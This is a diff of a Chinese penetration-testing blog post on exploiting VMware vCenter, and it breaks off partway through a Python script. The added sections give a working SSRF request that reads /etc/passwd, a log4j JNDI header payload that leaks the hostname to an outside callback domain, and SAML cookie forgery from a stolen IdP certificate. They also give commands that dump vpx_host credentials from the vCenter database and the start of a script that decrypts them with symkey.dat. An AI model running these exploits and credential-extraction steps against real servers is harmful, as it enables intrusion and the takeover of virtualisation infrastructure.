@@ -10,7 +10,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-05-05T15:23:00+08:00" />
-<meta property="article:modified_time" content="2022-05-08T15:23:00+08:00" />
+<meta property="article:modified_time" content="2022-05-10T15:23:00+08:00" />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="vCenter 漏洞利用"/>
@@ -27,8 +27,8 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.geekby.site\/2022\/05\/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\/"
-        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试","wordcount":  971 ,
-        "url": "https:\/\/www.geekby.site\/2022\/05\/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\/","datePublished": "2022-05-05T15:23:00+08:00","dateModified": "2022-05-08T15:23:00+08:00","publisher": {
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试","wordcount":  1536 ,
+        "url": "https:\/\/www.geekby.site\/2022\/05\/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\/","datePublished": "2022-05-05T15:23:00+08:00","dateModified": "2022-05-10T15:23:00+08:00","publisher": {
             "@type": "Organization",
             "name": "Geekby","logo": {
                     "@type": "ImageObject",
@@ -109,8 +109,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">vCenter 漏洞利用</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-05">2022-05-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 971 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-05">2022-05-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1536 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -151,6 +151,20 @@
             </li>
           </ul>
         </li>
+        <li><a href="#26-provider-logo-ssrf-漏洞">2.6 provider-logo SSRF 漏洞</a>
+          <ul>
+            <li><a href="#261-漏洞利用">2.6.1 漏洞利用</a></li>
+            <li><a href="#262-漏洞分析">2.6.2 漏洞分析</a></li>
+          </ul>
+        </li>
+        <li><a href="#27-log4j2-jndi-注入">2.7 log4j2 JNDI 注入</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-后渗透测试">3 后渗透测试</a>
+      <ul>
+        <li><a href="#31-saml-证书登录">3.1 SAML 证书登录</a></li>
+        <li><a href="#32-cve-2022-22948-权限配置不当">3.2 CVE-2022-22948 权限配置不当</a></li>
+        <li><a href="#33-cve-2021-22015---vcenter-提权漏洞">3.3 CVE-2021-22015 - vCenter 提权漏洞</a></li>
       </ul>
     </li>
   </ul>
@@ -161,7 +175,7 @@
 <ul>
 <li>VMware Inc</li>
 </ul>
-<p>**VMware Inc. ** 是一家软件公司。它开发了许多产品，尤其是各种云解决方案 。它的云解决方案包括云产品，数据中心产品和桌面产品等。</p>
+<p>**VMware Inc ** 是一家软件公司。它开发了许多产品，尤其是各种云解决方案 。它的云解决方案包括云产品，数据中心产品和桌面产品等。</p>
 <ul>
 <li>vSphere</li>
 </ul>
@@ -179,6 +193,14 @@
 </ul>
 <p>在 ESXi 6.0 之前是通过 C/S 架构来管理 ESXi 集群的，没有 web 端，且安装环境较为苛刻，必须为 Server 版本的服务器才可以安装。在 6.0 版本之后，官方已经取消了 C/S 架构的客户端，转而采用了 web 管理平台，又被称之为  vSphere web client。而部署了 vSphere web client 的服务器被称之为 <strong>vCenter Server</strong>。</p>
 <p>官方推荐将打包好的 Client 与 Server 应用部署在 VMware 自家的 Photon 系统下，其安装包命名为：VMware vCenter Server Appliance，简称为：<strong>VCSA</strong>。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101547624.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101547624.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101547624.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101547624.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101547624.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101547624.png-water_print" /></p>
 <h2 id="2-常见漏洞">2 常见漏洞</h2>
 <h3 id="21-版本信息探测">2.1 版本信息探测</h3>
 <p>通过调用 VMWare Sphere 组件的 SOAP API，可以获取其版本信息，XML 数据如下：</p>
@@ -777,6 +799,398 @@
         alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print"
         title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print" /></p>
 <p>最终 <code>@testbnull</code> 发现可以通过上下文可用的 <code>$GLOBAL-logger</code>，利用 <code>setFile</code> 方法临时修改日志路径到 Web 路径的方式，写入 WebShell 实现 RCE。</p>
+<h3 id="26-provider-logo-ssrf-漏洞">2.6 provider-logo SSRF 漏洞</h3>
+<h4 id="261-漏洞利用">2.6.1 漏洞利用</h4>
+<p>VMware vCenter v 7.0.x 的某些版本中存在未授权 SSRF 漏洞，可以读取本地文件造成敏感信息泄露；读取远程文件形成 XSS 漏洞。</p>
+<p>POC &amp; EXP：</p>
+<ul>
+<li><code>/nuclei-templates/vulnerabilities/vmware/vmware-vcenter-ssrf.yaml</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">{{target}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取 <code>/etc/passwd</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091604009.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091604009.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091604009.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091604009.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091604009.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091604009.png-water_print" /></p>
+<p>读取 postgresql 配置文件：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091652926.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091652926.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091652926.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091652926.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091652926.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091652926.png-water_print" /></p>
+<h4 id="262-漏洞分析">2.6.2 漏洞分析</h4>
+<p>漏洞 url 为 <code>/ui/vcav-bootstrap/rest/vcav-providers/provider-logo</code>，通过 500 错误获取代码调用栈，最后在 <code>ProvidersController.getProviderLogo</code> 执行时出错。定位到相关 jar 包：<code>/etc/vmware/vsphere-ui/cm-service-packages/com.vmware.cis.vsphereclient.plugin/com.vmware.h4.vsphere.client-0.4.1.0/plugins/h5-vcav-bootstrap-service.jar</code>。</p>
+<p><code>com.vmware.h4.vsphere.ui.bootstrap.controller.ProvidersController.getProviderLogo()</code> 函数代码比较简单，通过 <code>URLConnection</code> 读取 URL 并解析。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091611840.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091611840.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091611840.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091611840.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091611840.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091611840.png-water_print" /></p>
+<h3 id="27-log4j2-jndi-注入">2.7 log4j2 JNDI 注入</h3>
+<p>VMware 的产品同样也受 log4j2 漏洞的影响，具体可以参考：<a href="https://www.vmware.com/security/advisories/VMSA-2021-0028.html" target="_blank" rel="noopener noreffer">VMSA-2021-0028</a>。</p>
+<p>POC：</p>
+<ul>
+<li><code>/nuclei-templates/vulnerabilities/vmware/vmware-vcenter-log4j-jndi-rce.yaml</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/websso/SAML2/SSO/vsphere.local?SAMLRequest=</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">{{Hostname}}</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-Forwarded-For</span><span class="o">:</span> <span class="l">${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>具体漏洞成因在此就不再赘述。</p>
+<h2 id="3-后渗透测试">3 后渗透测试</h2>
+<h3 id="31-saml-证书登录">3.1 SAML 证书登录</h3>
+<p>vSphere 5.0 版本引入了 SSO，支持使用 SAML 作为授权服务支持。当用户登录服务时，该服务会将身份验证请求转发给 SAML 。SAML 验证用户凭据是否正确以及他们是否有权访问指定的服务。</p>
+<p>在 vCenter 中从 <code>/storage/db/vmware-vmdir/data.mdb</code> 提取 IdP 证书，为管理员用户创建 SAML 请求，最后使用 vCenter server 进行身份验证并获得有效的管理员 cookie。</p>
+<p>首先需要从 vCenter 获得数据库文件：</p>
+<ul>
+<li>Linux：<code>/storage/db/vmware-vmdir/data.mdb</code></li>
+<li>Windows：<code>C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb</code></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091200235.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091200235.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091200235.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091200235.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091200235.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091200235.png-water_print" /></p>
+<p>利用 SAML <a href="https://github.com/horizon3ai/vcenter_saml_login" target="_blank" rel="noopener noreffer">解密脚本</a>生成 Cookie：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 vcenter_saml_login.py -p data.mdb -t 192.168.0.92
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223914.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223914.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223914.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223914.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223914.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223914.png-water_print" /></p>
+<p>登录 VCSA 管理面板，访问 <code>https://IP/ui</code>，并设置 Cookie 为上面的返回结果。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223366.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223366.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223366.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223366.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223366.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205091223366.png-water_print" /></p>
+<h3 id="32-cve-2022-22948-权限配置不当">3.2 CVE-2022-22948 权限配置不当</h3>
+<p>vCenter Server 包含由于文件权限不正确而导致的信息泄露漏洞，可以利用此漏洞在对 vCenter Server 具有非管理员访问权限的情况下获取敏感信息。</p>
+<p>通过第二节描述的漏洞获取的 webshell 权限通常为：<code>vphere-ui</code>，归属于用户组：<code>cis</code>。在 vCenter 系统的研究中，存在一个包含客户端 <code>postgresDB</code> 的明文登录凭证的文件：<code>/etc/vmware-vpx/vcdb.properties</code>。任何属于 <code>cis</code>  组的用户都可以访问这个文件。即：任何属于 <code>cis</code> 组的用户都可以连接到 vCenter 的 Postgres 数据库。</p>
+<p>获取 postgresql 配置文件信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># linux</span>
+</span></span><span class="line"><span class="cl">cat /etc/vmware-vpx/vcdb.properties
+</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
+</span></span><span class="line"><span class="cl">cat /etc/vmware/service-state/vpxd/vcdb.properties
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># windows</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type</span>  C:<span class="se">\P</span>rogramData<span class="se">\V</span>Mware<span class="se">\v</span>CenterServer<span class="se">\c</span>fg<span class="se">\v</span>mware-vps<span class="se">\v</span>cdb.properties
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接数据库，读取 vpxuser 密钥：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># linux</span>
+</span></span><span class="line"><span class="cl">/opt/vmware/vpostgres/current/bin/psql -h 127.0.0.1 -p <span class="m">5432</span> -U vc -d VCDB -c <span class="s2">&#34;select ip_address,user_name,password from vpx_host;&#34;</span> &gt; password.enc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#windows</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogram Files<span class="se">\V</span>Mware<span class="se">\v</span>Center Server<span class="se">\v</span>Postgres<span class="se">\b</span>in<span class="se">\p</span>sql.exe -h 127.0.0.1 -p <span class="m">5432</span> -U vc -d VCDB -c <span class="s2">&#34;select ip_address,user_name,password from vpx_host;&#34;</span> &gt; password.enc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101036280.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101036280.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101036280.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101036280.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101036280.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101036280.png-water_print" /></p>
+<p>获取 <code>symkey.dat</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># linux</span>
+</span></span><span class="line"><span class="cl">cat /etc/vmware-vpx/ssl/symkey.dat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># windows</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\P</span>rogramData<span class="se">\V</span>Mware<span class="se">\v</span>CenterServer<span class="se">\c</span>fg<span class="se">\v</span>mware-vpx<span class="se">\s</span>sl<span class="se">\s</span>ymkey.dat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密 vpxuser 密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 decrypt.py symkey.dat password.enc password.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101033946.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101033946.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101033946.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101033946.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101033946.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101033946.png-water_print" /></p>
+<p>解密脚本如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">usage</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Where is symkey.dat
+</span></span></span><span class="line"><span class="cl"><span class="s2">Windows：C:\ProgramData\VMware</span><span class="se">\v</span><span class="s2">CenterServer\cfg</span><span class="se">\v</span><span class="s2">mware-vpx\ssl\symkey.dat
+</span></span></span><span class="line"><span class="cl"><span class="s2">Linux：/etc/vmware-vpx/ssl/symkey.dat
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Where is psql
+</span></span></span><span class="line"><span class="cl"><span class="s2">Windows: C:\Program Files\VMware</span><span class="se">\v</span><span class="s2">Center Server</span><span class="se">\v</span><span class="s2">Postgres</span><span class="se">\b</span><span class="s2">in\psql.exe
+</span></span></span><span class="line"><span class="cl"><span class="s2">Linux: /opt/vmware/vpostgres/current/bin/psql
+</span></span></span><span class="line"><span class="cl"><span class="s2">psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c &#34;select ip_address,user_name,password from vpx_host;&#34; &gt; password.enc
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">python3 decrypt.py symkey.dat password.enc password.txt
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pkcs7unpadding</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">padding_length</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">length</span><span class="o">-</span><span class="n">padding_length</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">enc_passwords</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">enc_password</span> <span class="ow">in</span> <span class="n">enc_passwords</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc_password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">iv_bytes</span> <span class="o">=</span> <span class="n">content</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">enc_password_bytes</span> <span class="o">=</span> <span class="n">content</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password_bytes</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc_password_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">password_bytes</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">pkcs7unpadding</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">passwords</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">save_decrypt_password</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">passwords</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">passwords</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_encrypt_password</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypt_passwords</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">encrypt_password</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
